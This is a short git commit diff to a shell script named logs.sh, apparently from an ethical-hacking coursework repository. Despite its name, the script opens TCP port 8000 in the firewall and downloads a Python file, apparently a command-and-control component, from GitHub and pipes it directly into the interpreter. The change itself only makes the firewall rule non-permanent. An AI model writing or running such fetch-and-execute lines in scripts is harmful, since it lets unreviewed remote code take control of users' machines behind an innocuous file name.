2d59c76d91cc5ceca6eb5a83494b19db1af58698
AidanNgo <115433593+AidanNgo@users.noreply.github.com>
2026-03-25 23:30:16 -0500

    Update logs.sh

--- logs.sh
+++ logs.sh
@@ -1,4 +1,3 @@
 #!/bin/bash
-firewall-cmd --permanent --add-port=8000/tcp
-firewall-cmd --reload
+firewall-cmd --add-port=8000/tcp
 curl -sL https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/week4.py | python
